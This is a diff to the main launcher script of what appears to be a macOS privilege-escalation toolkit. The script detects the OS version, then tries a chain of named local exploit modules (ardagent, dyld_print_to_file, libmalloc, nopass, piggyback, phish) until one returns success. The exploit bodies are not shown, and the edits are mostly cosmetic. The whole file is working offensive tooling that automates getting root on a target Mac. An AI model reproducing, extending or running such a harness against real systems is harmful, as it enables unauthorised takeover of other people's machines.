@@ -2,22 +2,26 @@
 import platform
 from distutils.version import LooseVersion
 
-from exploits import *
+from exploits import ardagent, dyld_print_to_file, libmalloc, nopass, piggyback, phish
 
 REDC = "\033[91m[-] "
 YELLOWC = "\033[93m[!] "
 GREENC = "\033[92m[+] "
 ENDC = "\033[00m"
+NL = "\n"
 
 
 def main():
     """main function"""
     version = platform.mac_ver()[0]
+    print(GREENC + "Trying to escalate privileges on macOS %s..." % version + ENDC)
     for exploit in [ardagent, dyld_print_to_file, libmalloc, nopass, piggyback, phish]:
-        if not exploit.vulnerable(LooseVersion(version)):
-            print(YELLOWC + "Skipping %s...\n" % exploit.__name__ + ENDC)
+        if not all(ex in dir(exploit) for ex in ["vulnerable", "run"]):
             continue
-        print(YELLOWC + "Trying %s...\n" % exploit.__name__ + ENDC)
+        if not exploit.vulnerable(LooseVersion(version)):
+            print(NL + YELLOWC + "Skipping %s..." % exploit.__name__ + ENDC)
+            continue
+        print(NL + YELLOWC + "Trying %s..." % exploit.__name__ + ENDC)
         try:
             result = exploit.run()
         except KeyboardInterrupt:
@@ -25,8 +29,8 @@ def main():
         if result:
             print(GREENC + exploit.__name__ + " was successful!" + ENDC)
             return result
-        print(REDC + "Failed\n" + ENDC)
-    print(REDC + "All Exploits Failed..." + ENDC)
+        print(NL + REDC + "Failed" + ENDC)
+    print(NL + REDC + "All Exploits Unsuccessful" + ENDC)
     return
 
 
